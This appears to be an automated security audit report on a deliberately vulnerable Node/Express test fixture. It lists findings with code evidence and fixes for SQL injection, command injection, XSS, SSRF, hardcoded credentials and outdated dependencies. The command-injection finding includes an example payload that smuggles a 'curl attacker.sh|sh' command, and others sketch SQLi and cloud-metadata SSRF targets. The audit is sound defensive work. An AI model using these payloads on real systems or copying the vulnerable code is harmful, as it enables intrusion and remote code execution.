# Security Audit — node-vuln-app (fixture)
Date: 2026-09-22 | Scope: working tree | Auditor: security-skills v1.2.0-92-g433fb22-dirty
Knowledge base: 36 vuln-db entries (newest 2026-09-11) | Live checks: OSV.dev + CISA KEV — NOT RUN (no network)

## Stack
Node/Express classic-classes fixture: Express 4.17.3 + mysql2 2.3.3 (+ lodash 4.17.20, moment 2.29.1 — both unused in code), single `app.js`, 7 HTTP routes, no infra files, no auth mechanism of any kind, MySQL backend, outbound `fetch`. No multi-step business flow (flow-security: not applicable).

## Summary
| Severity | Count |
|---|---|
| Critical | 5 |
| High | 6 |
| Medium | 5 |
| Low | 1 |

**Chains (completed):**
- Unauthenticated RCE: `/ping-host` command injection (SEC-002) + zero auth on all routes (SEC-007) = pre-auth remote code execution
- XSS × no-CSP: reflected XSS (SEC-003) with no security headers (SEC-010) — zero mitigation layers
- Secret exposure × logging: hardcoded AWS key id (SEC-005) logged at startup (SEC-006)

## Findings

### SEC-001: SQL injection via template literal — CRITICAL
- **Where:** `app.js:21-23`
- **CWE:** CWE-89
- **Evidence:**
  ```js
  connection.query(
    `SELECT * FROM users WHERE name = '${req.query.name}'`,
  ```
- **Impact:** Unauthenticated (`/users` has no guard — census row 1) read/escalation of the `users` table: `' UNION SELECT ...`, auth bypass, full data extraction.
- **Fix:** `connection.query('SELECT * FROM users WHERE name = ?', [req.query.name], cb)`
- **References:** OWASP A03

### SEC-002: OS command injection in `/ping-host` — CRITICAL
- **Where:** `app.js:30`
- **CWE:** CWE-78
- **Evidence:**
  ```js
  exec(`ping -c 1 ${req.query.host}`, (err, stdout) => res.send(stdout));
  ```
- **Impact:** `?host=8.8.8.8; curl attacker.sh|sh` → unauthenticated RCE on the app host; output is returned to the caller (exfil channel).
- **Fix:** `execFile('ping', ['-c','1', host])` with hostname allowlist/regex; never string-interpolate into shell.
- **References:** OWASP A03

### SEC-003: Reflected XSS in `/greet` — HIGH
- **Where:** `app.js:35`
- **CWE:** CWE-79
- **Evidence:**
  ```js
  res.send(`<h1>Hello ${req.query.name}</h1>`);
  ```
- **Impact:** HTML content-type + raw interpolation → script injection in victims' browsers; no CSP anywhere to blunt it (see SEC-010).
- **Fix:** escape (`express-es6-template`/`escape-html`) or `res.json({ greeting })`.

### SEC-004: MD5 on password-like field — CRITICAL
- **Where:** `app.js:40`
- **CWE:** CWE-916 / CWE-327
- **Evidence:**
  ```js
  const key = crypto.createHash('md5').update(req.body.password).digest('hex');
  ```
- **Impact:** Fast unsalted hash on a password → instant cracking of any leaked value; the digest is also returned to the client. Note: `/hash` reads `req.body` but no body-parser middleware is mounted — the endpoint currently crashes; the vulnerability is live the moment body parsing is added.
- **Fix:** passwords: `bcrypt`/`argon2id`. If this is genuinely key-derivation, use `crypto.scrypt`/`hkdf` with a per-user salt.

### SEC-005: Hardcoded AWS access key id (example-format — verify) — CRITICAL (Possible — needs verification)
- **Where:** `app.js:11`
- **CWE:** CWE-798
- **Evidence:**
  ```js
  const AWS_ACCESS_KEY_ID = 'AKIAI44QH8DHBEXAMPLE';
  ```
- **Impact:** If a matching `aws_secret_access_key` exists anywhere (env, config, deploy), this is live cloud-credential exposure. The value matches AWS's documented EXAMPLE format — verify against deployed config and rotate if it ever ran.
- **Fix:** Remove from source; IAM keys belong in a secret manager. Rotation is the fix — deletion from HEAD does not revoke.

### SEC-006: Secrets leaked into logs — HIGH
- **Where:** `app.js:66` (also `app.js:10` context)
- **CWE:** CWE-532
- **Evidence:**
  ```js
  app.listen(3000, () => console.log('started with key', AWS_ACCESS_KEY_ID));
  ```
- **Impact:** The key id ships to any log aggregator; `DB_PASSWORD` (line 10, hardcoded — see SEC-012) is one refactor away from the same.
- **Fix:** never log credential material; structured logging with field allowlists.

### SEC-007: No authentication on ANY route (census 0/7) — CRITICAL
- **Where:** `app.js:20-63` (all seven handlers; no auth middleware registered anywhere)
- **CWE:** CWE-306
- **Evidence:** route census table below — every row's auth column is "none"; no session/token/JWT code exists in the file.
  | Route | Auth | Ownership check |
  |---|---|---|
  | GET /users | none | n/a |
  | GET /ping-host | none | n/a |
  | GET /greet | none | n/a |
  | POST /hash | none | n/a |
  | GET /fetch-url | none | n/a |
  | GET /admin/users | none | none |
  | POST /login | none (no-op) | n/a |
- **Impact:** The `/admin/*` surface (SEC-008) and every injection is reachable pre-authentication; `POST /login` returns `{ok:true}` unconditionally — a decorative login.
- **Fix:** session or token middleware mounted before routes; admin scope behind a role check; make login actually verify credentials.

### SEC-008: Unauthenticated admin data endpoint + interpolated id — CRITICAL
- **Where:** `app.js:52-56`
- **CWE:** CWE-306 / CWE-89
- **Evidence:**
  ```js
  app.get('/admin/users', (req, res) => {
    connection.query(
      `SELECT * FROM users WHERE id = ${req.params.id}`,
  ```
- **Impact:** Any caller dumps arbitrary user records (`results[0]` returned). The `${req.params.id}` interpolation is SQLi-shaped — currently `req.params.id` is always `undefined` (no `:id` in the path), so it errors rather than injects; add a path param and it becomes a live injection.
- **Fix:** guard the route (auth + role), parameterize (`WHERE id = ?`), take the id from `req.params.id` only with validation.

### SEC-009: SSRF via `/fetch-url` — HIGH
- **Where:** `app.js:48-49`
- **CWE:** CWE-918
- **Evidence:**
  ```js
  const r = await fetch(req.query.url);
  res.json(await r.json());
  ```
- **Impact:** Unauthenticated server-side fetch of arbitrary URLs: internal services, `file://` (Node 18+ fetch blocks file:, note), cloud metadata `http://169.254.169.254/...` — response body returned to the caller. No allowlist, no redirect limits, no private-IP blocking.
- **Fix:** destination host allowlist; resolve-then-block private/link-local ranges; `redirect: 'error'`.
- **References:** OWASP A10

### SEC-010: No security headers / no CSP (chain-critical) — MEDIUM
- **Where:** `app.js:13-16` (middleware setup — only `express()` + nothing else)
- **CWE:** CWE-693
- **Evidence:** grep for helmet/X-Frame-Options/nosniff/CSP → 0 matches; `x-powered-by` not disabled.
- **Impact:** Standalone: defense-in-depth gaps. As the chain partner of SEC-003 (XSS with zero CSP backstop) — tagged **chain-critical**.
- **Fix:** `app.use(helmet())` minimum; CSP appropriate to a JSON/HTML hybrid API.

### SEC-011: A09 — no auth audit events + raw header logged (log forging) — MEDIUM
- **Where:** `app.js:60-63`
- **CWE:** CWE-778 / CWE-117
- **Evidence:**
  ```js
  console.log('login attempt from UA:', req.headers['user-agent']);
  ```
- **Impact:** No structured success/failure audit records for auth events (who/when/outcome absent — investigations impossible); unsanitized `User-Agent` into logs → log forging (`\n` injection poisons SIEM parsing). No rate limiting on `/login` either (stuffing-unchecked).
- **Fix:** structured audit events (actor, action, result, timestamp) + UA sanitization + rate limiting middleware on auth routes.

### SEC-012: Hardcoded database password — CRITICAL
- **Where:** `app.js:10`
- **CWE:** CWE-798
- **Evidence:**
  ```js
  const DB_PASSWORD = 'Sup3rS3cretPr0dPass!';
  ```
- **Impact:** Realistic-looking prod-labeled DB credential in source; every clone/deploy carries it; no rotation path.
- **Fix:** move to env/secret manager and rotate the existing value (removal ≠ revocation).

### SEC-013: Dependency versions below fix lines (offline range check) — HIGH
- **Where:** `package.json:5` (express 4.17.3)
- **CWE:** CWE-1104
- **Evidence:** `express: 4.17.3` — below the fix lines of vuln-db entries CVE-2024-43796 (res.redirect open redirect, fixed 4.21.2) and CVE-2024-45590 (body-parser DoS, fixed 4.21.0); express 4.17.3's real tree resolves qs/path-to-regexp in known-vulnerable ranges (CVE-2022-24999, CVE-2024-45295). Live OSV not run — verify versions after upgrade.
- **Impact:** Body-parser DoS is unauthenticated per-request; redirect flaw requires `res.redirect` usage (none in this file — currently dormant).
- **Fix:** `express@^4.21.2` (or 5.x); refresh lockfile so transitive qs/path-to-regexp resolve fixed.
- **References:** vuln-db entries 2024-09-10-cve-2024-43796, 2024-09-10-cve-2024-45590, 2022-11-17-cve-2022-24999

### SEC-014: Dormant vulnerable dependencies + lockfile hygiene — LOW/MEDIUM
- **Where:** `package.json:6-8`, `package-lock.json`
- **CWE:** CWE-1104 / CWE-1357
- **Evidence:** `lodash 4.17.20` (<4.17.21, CVE-2021-23337) and `moment 2.29.1` (<2.29.4, ReDoS CVE-2022-31129) — **reachability: neither is imported anywhere in `app.js`** (0 `require` hits) → dormant. Lockfile records no `integrity` hashes and no transitive packages (trimmed) → resolution not verifiable offline.
- **Impact:** Currently unreachable; any future `require('lodash')` with `_.template(userInput)` revives CVE-2021-23337 as command injection. Lockfile without integrity/pins weakens reproducibility.
- **Fix:** upgrade both while touching the manifest (cheap insurance); regenerate a full lockfile with integrity fields.

## What looks good
- `mysql2` used (vs raw mysql) — parameterized API is one line away for every query
- No dangerous/compromised packages present (vm2, request, event-stream, ua-parser-js compromised lines — all absent per the dangerous-packages pack)
- No `.env` files tracked; no private keys in tree
- No cookies/sessions in use — cookie-flag class not applicable
- Fixture discipline: values are example/fake formats (AWS key id is the documented EXAMPLE shape — flagged with verification note rather than asserted)

## What would make this worse (almost-chains)
- SSRF (SEC-009) + cloud metadata: no infra files in repo to verify IMDSv2/egress rules — if this deploys to EC2 with IMDSv1, the chain completes to credential theft
- Command injection (SEC-002) + container escape: no Dockerfile present to check root/privileged context

## Recommended fix order
1. SEC-002 (unauth RCE, small effort) → execFile + allowlist
2. SEC-007/SEC-008 (auth + admin guard, small) → middleware before routes
3. SEC-001 (SQLi, small) → parameterize
4. SEC-012/SEC-005 (rotate credentials, small) → secret manager + rotation
5. SEC-004 (crypto, small) → argon2id
6. SEC-009 → allowlist fetcher
7. SEC-003 + SEC-010 → escape + helmet
8. SEC-013 → express upgrade + lockfile refresh
9. SEC-011 → audit events + rate limit
